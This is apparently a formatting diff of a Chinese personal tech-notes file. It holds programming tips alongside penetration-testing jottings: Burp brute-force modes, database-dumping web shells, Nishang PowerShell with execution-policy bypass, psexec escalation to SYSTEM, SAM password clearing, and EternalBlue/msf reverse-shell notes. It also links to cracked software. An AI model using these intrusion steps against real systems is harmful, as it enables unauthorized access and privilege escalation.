     2&gt;/dev/null表示将命令的错误输出重定向到/dev/null
     &amp;表示后台执行,你可以继续占有你的输入窗口
-<span class="p">200.</span>python时间输出格式化
+<span class="p">
+200.</span>python时间输出格式化
     http://blog.csdn.net/qq61394323/article/details/44620699
-<span class="p">201.</span>python的可变参数
+<span class="p">
+201.</span>python的可变参数
     http://blog.csdn.net/huangkangying/article/details/34508961
-<span class="p">202.</span>python全局变量
+<span class="p">
+202.</span>python全局变量
     (不同文件模块间的变量共享)
     http://www.51testing.com/html/49/101349-815499.html
-<span class="p">203.</span>vim中匹配<span class="se">\要</span>写成<span class="se">\\</span><span class="err">\</span>
+<span class="p">
+203.</span>vim中匹配<span class="se">\要</span>写成<span class="se">\\</span><span class="err">\</span>
     python中匹配<span class="se">\要</span>写成re.search(r"<span class="se">\\</span>")
-<span class="p">204.</span>python中MySQLdb模块操作
+    在正则替换时换行符要写成<span class="se">\r</span>
+    eg.在整理当前notes时的替换命令如下:
+    :%s/<span class="se">\v\n</span>+<span class="se">\s</span><span class="ge">*\n*</span>^(<span class="se">\d</span>+<span class="se">\.</span>)/<span class="se">\r\r\1</span>/g
+    其中替换成<span class="se">\r</span>表示换行,替换之后这个<span class="se">\r</span>其实是<span class="se">\n</span>,可被<span class="se">\n</span>在正则查找时匹配到
+<span class="p">
+204.</span>python中MySQLdb模块操作
     http://www.jianshu.com/p/76fab6cb06f9
     http://www.jb51.net/article/57290.htm
     官方api
@@ -1570,23 +1761,28 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
         http://blog.sina.com.cn/s/blog_53e68b3b0101bjxi.html
     动态创建数据库,表(可创建数据库---&gt;选择数据库---&gt;建表)
         http://blog.csdn.net/chichoxian/article/details/38224361
-<span class="p">205.</span>ssh端口转发
+<span class="p">
+205.</span>ssh端口转发
     http://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html
     ssh反向代理
     正向代理是指内网一台机器借助一台代理机器上网,所以反向代理是外网机器借助一台代理机器访问内网
     https://segmentfault.com/a/1190000002718360
-<span class="p">206.</span>文件恢复py
+<span class="p">
+206.</span>文件恢复py
     https://sourceforge.net/projects/easypythondecompiler/?source=typ_redirect
     http://www.yihaomen.com/article/python/515.htm
     http://zqpythonic.qiniucdn.com/data/20100910175015/index.html
     http://tool.lu/pyc/
-<span class="p">207.</span>insert into经常遇到的duplicate key entry...的解决:
+<span class="p">
+207.</span>insert into经常遇到的duplicate key entry...的解决:
     http://blog.csdn.net/i10630226/article/details/51759701
     insert into vs insert ignore into
         http://www.111cn.net/database/mysql/56643.htm
-<span class="p">208.</span>python数据库中文乱码尝试解决
+<span class="p">
+208.</span>python数据库中文乱码尝试解决
     http://fc-lamp.blog.163.com/blog/static/174566687201210285137981/
-<span class="p">209.</span>python中的print和sys.stdout.write:
+<span class="p">
+209.</span>python中的print和sys.stdout.write:
     sys.stdout是一个文件句柄,默认缺省值是终端输出,如果这样:
         sys.stdout=open('file.txt','w')
     那么sys.stdout这个文件句柄就不再是指向终端输出了,而是指向文件file.txt了
@@ -1595,25 +1791,33 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
         sys.stdout=open('file.txt','w')
         print ...(or sys.stdout.write(...))--&gt;将内容写到file.txt
         sys.stdout=tmp---&gt;重新找到终端输出的句柄
-<span class="p">210.</span>python中raw_input和print共存方案:
+<span class="p">
+210.</span>python中raw_input和print共存方案:
     http://stackoverflow.com/questions/2082387/reading-input-from-raw-input-without-having-the-prompt-overwritten-by-other-th
-<span class="p">211.</span>python3中MySQLdb不支持python3的解决:
+<span class="p">
+211.</span>python3中MySQLdb不支持python3的解决:
     http://blog.csdn.net/foryouslgme/article/details/52154152
-<span class="p">212.</span>linux后台前台任务切换
+<span class="p">
+212.</span>linux后台前台任务切换
     command&amp;:让进程在后台运行
     jobs:查看后台运行进程
     fg %n:让后台运行的进程n到前台来
     bg %n:让进程n到后台去
     ctrl+z:将前台在执行的命令放到后台并暂停
     n指的是jobs命令中的编号
-<span class="p">213.</span>mysql不支持select top n column_name from ...,用select ....limit n(m,n)代替
-<span class="p">214.</span>php在线加密
+<span class="p">
+213.</span>mysql不支持select top n column_name from ...,用select ....limit n(m,n)代替
+<span class="p">
+214.</span>php在线加密
     http://www.phpjiami.com/phpjiami.html
-<span class="p">215.</span>火车票购买时间
+<span class="p">
+215.</span>火车票购买时间
     提前60天,早上7点到7:30,中午12点,晚上10-11点,发车前1-2天,买区间票先上车
-<span class="p">216.</span>install/uninstall vim8
+<span class="p">
+216.</span>install/uninstall vim8
     http://tipsonubuntu.com/2016/09/13/vim-8-0-released-install-ubuntu-16-04/
-<span class="p">217.</span>python代码格式化工具,autopep8,pycodestyle用来检查代码是否有不规范的格式
+<span class="p">
+217.</span>python代码格式化工具,autopep8,pycodestyle用来检查代码是否有不规范的格式
     usage:https://pypi.python.org/pypi/autopep8
     autopep8 --in-place --aggressive --aggressive file
     autopep8 -i -a -a file
@@ -1623,13 +1827,17 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
         https://github.com/google/yapf
         pip install yapf
     暂时认为autopep8更好
-<span class="p">218.</span>ubuntu16.04安装npm
+<span class="p">
+218.</span>ubuntu16.04安装npm
     http://www.jianshu.com/p/1016f79a443f
-<span class="p">219.</span>html织网背景js
+<span class="p">
+219.</span>html织网背景js
     https://github.com/hustcc/canvas-nest.js
-<span class="p">220.</span>scrapy教程
+<span class="p">
+220.</span>scrapy教程
     http://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/tutorial.html
-<span class="p">221.</span>burpsuite中的四种attack爆破模式
+<span class="p">
+221.</span>burpsuite中的四种attack爆破模式
     https://portswigger.net/burp/help/intruder_positions.html
     http://www.freebuf.com/articles/5560.html
     sniper:
@@ -1642,7 +1850,8 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
     cluster bomb:
     每个position处的值各自遍历自己所属的payloads列表,且不平行遍历,相当于排列组合,如爆破username:password时用这
     个爆破(一个或多个payload列表)
-<span class="p">222.</span>符号执行,污点分析
+<span class="p">
+222.</span>符号执行,污点分析
     http://jst.tsinghuajournals.com/CN/rhhtml/20160105.htm
     http://cdmd.cnki.com.cn/Article/CDMD-10248-1011268430.htm
 <span class="p">
@@ -1741,7 +1950,7 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
            Some records, like MX, never go through CloudFlare (no cloud).
     4&gt;子域爆破,扫c段,改hosts文件,可正常访问得到对应页面则认为是真实ip
     5&gt;上面没有找到,直接查找a记录,找出不是cdn的ip,改hosts文件,可正常访问得到对应页面则认为是真实ip
-    
+
 </span><span class="p">231.</span>子域在线查询
     http://i.links.cn/subdomain/
 <span class="p">
@@ -1801,7 +2010,6 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
     +short 8.8.8.8才显示结果是3xp10it.github.io.
     试着用一个大的dns列表再去逐个解析(查询)3xp10it.cc的cname记录值:
 
-
 </span><span class="p">235.</span>ubuntu设置dns
     http://www.ahlinux.com/ubuntu/23267.html
 <span class="p">
@@ -1847,6 +2055,7 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
 
     &lt;a href="{`added`{ post.url | prepend: site.baseurl }`added`}"&gt;{`added`{ post.date | date:"%Y-%m-%d" }`added`} {`added`{ post.title }`added`}&lt;/a&gt;&lt;br&gt;
 	{`added`% endfor %`added`}
+
 </span><span class="p">242.</span>python用于捕获ctrl+c的键盘事件:
 	i=0
 	try:
@@ -1855,7 +2064,8 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
 			i=i+1
 	except KeyboardInterrupt:
 		print("you input ctrl+c")
-<span class="p">242.</span>vim匹配正则删除行
+<span class="p">
+242.</span>vim匹配正则删除行
 	http://blog.csdn.net/joeblackzqq/article/details/7399019
 	删除包含kernel32的行
 	:g/kernel32/d<span class="sb">
@@ -1869,8 +2079,10 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 <span class="p">
 244.</span>docker
 	http://kb.cnblogs.com/page/536115/
-<span class="p">245.</span>php脱库用1337.php,aspx脱库用spyaspx
-<span class="p">246.</span>nishang用法
+<span class="p">
+245.</span>php脱库用1337.php,aspx脱库用spyaspx
+<span class="p">
+246.</span>nishang用法
 	http://resources.infosecinstitute.com/nishang-a-post-exploitation-framework/
 	Powershell.exe –exec bypass –Command "&amp; {Import-Module 'C:<span class="se">\U</span>sers<span class="se">\U</span>ser<span class="se">\D</span>esktop<span class="se">\t</span>emp<span class="se">\C</span>heck-VM.ps1'; Check-VM}"<span class="sb">
 
@@ -1879,6 +2091,7 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 	Set-ExecutionPolicy remotesigned[开启ps可执行]
 	import-module .\Invoke-PortScan.ps1
 	Invoke-PortScan -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort 
+
 </span><span class="p">247.</span>reGeorg无法连接时,net stop + taskkill /F /IM 把可疑进程结束掉就可以连接了
 <span class="p">
 248.</span>ps1无法执行时,解决方法:
@@ -1890,7 +2103,7 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 250.</span>坑:
 	a)windows下的for命令读文件时,如果文件是unicode编码读不出来,要改成ansi
     b)python读文件以"a+"模式打开时要先f.seek(0)再r.read(),否则读不到内容
-<span class="p">		
+<span class="p">
 251.</span>python转成exe
 	https://mborgerson.com/creating-an-executable-from-a-python-script
 	pyinstaller.exe --onefile --windowed app.py
@@ -1911,11 +2124,13 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 	因此,在尝试获取domain的cdn背后的真实ip时,exp10it.py模块中的get_http_or_https可能因此而受干扰<span class="p">[</span><span class="nv">GFW+cdn</span><span class="p">]</span>
 	因此,修改exp10it.py模块中的get_http_or_https函数,先用baidu<span class="p">[</span><span class="nv">site:{domain}</span><span class="p">]</span>这样查一下对方是http还是https,如果
 	得不到再用原来get_http_or_https的方法继续
-<span class="p">255.</span>python打包代码setup.py文件
+<span class="p">
+255.</span>python打包代码setup.py文件
 	http://blog.useasp.net/archive/2014/09/09/packaging-python-libraries-and-upload-to-pypi-python-package-index.aspx
-<span class="p">	
+<span class="p">
 256.</span>pip install 无法安装最新python包的时候试试把当前terminal关掉然后新开terminal再pip install
-<span class="p">257.</span>python打包模块上传时,打包其他文件夹或文件:
+<span class="p">
+257.</span>python打包模块上传时,打包其他文件夹或文件:
 	新建MANIFEST.in文件,eg.内容如下<span class="p">[</span><span class="nv">graft是包含文件夹</span><span class="p">]</span>
 		include <span class="err">*</span>.md
 		graft cms_identify
@@ -1924,14 +2139,14 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 	但是这样包含的文件夹虽然会上传到pypi中,但是pip install moduleName时在MANIFEST.in中的文件夹不会被安装到系统
 	dist-packages中,如果需要在pip install命令后将文件夹也安装到dist-packages中则需要在setup.py中的packages参数
 	中填写上面的三个文件夹名
-<span class="p">	
+<span class="p">
 258.</span>眼保健操
 	1&gt;太阳穴(食指)
 	2&gt;上眼眶
 	3&gt;下眼眶
 	4&gt;风池穴(食指+中指,后颈凹处)
 	5&gt;揉耳眶
-<span class="p">	
+<span class="p">
 259.</span>django教程
 	http://www.ziqiangxuetang.com/django/django-tutorial.html
 	http://cdwanze.github.io/%E7%94%B5%E8%84%91/python/Django/django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html
@@ -1953,10 +2168,12 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 				@login_required
 				def index(request):
 					...
-<span class="p">260.</span>关闭占用的端口
+<span class="p">
+260.</span>关闭占用的端口
 	netstat -ntlp
 	kill -9 pid
-<span class="p">261.</span>css拷贝神器,一次复制一个div所有样式
+<span class="p">
+261.</span>css拷贝神器,一次复制一个div所有样式
 	http://stackoverflow.com/questions/4911338/tools-to-selectively-copy-htmlcssjs-from-existing-sites
 	https://github.com/kdzwinel/SnappySnippet<span class="sb">
 
@@ -1964,6 +2181,7 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 	padding:内边框
 	水平居中方法
 		http://www.jb51.net/css/12310.html
+
 </span><span class="p">262.</span>python调试
 	import pdb
 	pdb.set_trace()
@@ -1971,7 +2189,8 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 263.</span>wooyun文章
 	链接:http://pan.baidu.com/s/1i4ZP8Vj 密码:yybp
 	链接:http://pan.baidu.com/s/1mhZJFS0 密码:t20m
-<span class="p">264.</span>eval和assert的区别
+<span class="p">
+264.</span>eval和assert的区别
 	http://www.vuln.cn/8395
 	http://www.php.net/manual/zh/function.eval.php
 	http://php.net/manual/zh/functions.variable-functions.php
@@ -1981,7 +2200,8 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 <span class="p">
 266.</span>gitignore文件
 	https://github.com/github/gitignore
-<span class="p">267.</span>linux mint安装fcitx
+<span class="p">
+267.</span>linux mint安装fcitx
 	http://einverne.github.io/post/2015/10/things-to-do-after-install-linux-mint.html
 	弃用rime,上面这个就可以用了
 <span class="p">
@@ -2002,7 +2222,7 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 		d:到桌面<span class="p">[</span><span class="nv">这时win键还是不听话的</span><span class="p">]</span>
 		caps+空格<span class="err">[</span>按下这个组合比较简单,这里caps由于上面设置了,相当于ctrl+空格,然后win键就会听话了,原因是只要重
 		新运行下setxkbmap这个程序,win键就突然听话了]
-<span class="p">		
+<span class="p">
 271.</span>psexec从administrator权限获取system权限:
 	psexec.exe -s cmd.exe
 	psexec.exe <span class="se">\\</span>xxx -s cmd.exe
@@ -2016,7 +2236,7 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 <span class="p">	3.</span>c:/WINDOWS/system32/config/sam
 		如果删除了上面路径的sam可以到c:/WINDOWS/repaire目录下有个备份的sam
 <span class="p">	4.</span>http://www.uzzf.com/soft/59037.html这里面的工具打开sam并清空密码
-<span class="p">	
+<span class="p">
 274.</span>makefile文件怎么编译
 	http://www.cnblogs.com/BambooEatPanda/p/4994298.html
 	terminal:make
@@ -2479,7 +2699,7 @@ windows:
     <span class="nt">&lt;x86</span><span class="err">一次成功后失败了</span><span class="na">--</span><span class="nt">&gt;</span>本机换ip,换eternalblue和double...之外的模块,本地给x86测试看看有什么方案&gt;
     &lt;用msf版本:
     bind对方80/443端口,如果bind_tcp不行则用bind_http,再不行则用反弹shell,payload用reverse_http
-<span class="p">           
+<span class="p">
 345.</span>macOS下快速切换用户方法
     https://apple.stackexchange.com/questions/38390/is-there-a-shortcut-which-invokes-the-login-window-fast-user-switching-comm
     最后用的是:
@@ -2533,7 +2753,7 @@ windows:
     pudb
         pudb3 1.py
     https://documen.tician.de/pudb/starting.html
-<span class="p">        
+<span class="p">
 258.</span>最简单的百度云限速破解                
     1).用chrome设置用手机打开对应下载页面后下载,然后打开chrome的下载页面,复制下载链接用迅雷下载即可,如果不行则将要
     下载的文件放到一个文件夹,同样用chrome的手机模式下载文件夹后获取下载地址再用迅雷下载,但是这个不能下载大文件
@@ -2541,7 +2761,7 @@ windows:
     迅雷下载速度也受限,这是因为这个得到的下载地址里面带有用户信息,需要在百度网盘里将这个文件分享后退出登录再重
     新在安装了tampermonkey的情况下用chrome的手机模式下载以获得下载链接,这个链接是不带用户信息的(因为退出了登录),
     这时再用迅雷下载就不会限速了.
-<span class="p">   
+<span class="p">
 259.</span>macOS下的好用的虚拟机
     paralles desktop
 <span class="p">
@@ -2586,7 +2806,7 @@ windows:
 266.</span>macOS破解工具
     hopper(或许ida pro for mac更好,淘宝有180元的<span class="p">[</span><span class="nv">无f5功能</span><span class="p">]</span>)破解版下载
     http://www.sdifen.com/hopperdisassembler408.html
-<span class="p">        
+<span class="p">
 267.</span>16进制转字符
     http://www.bejson.com/convert/ox2str/
 <span class="p">
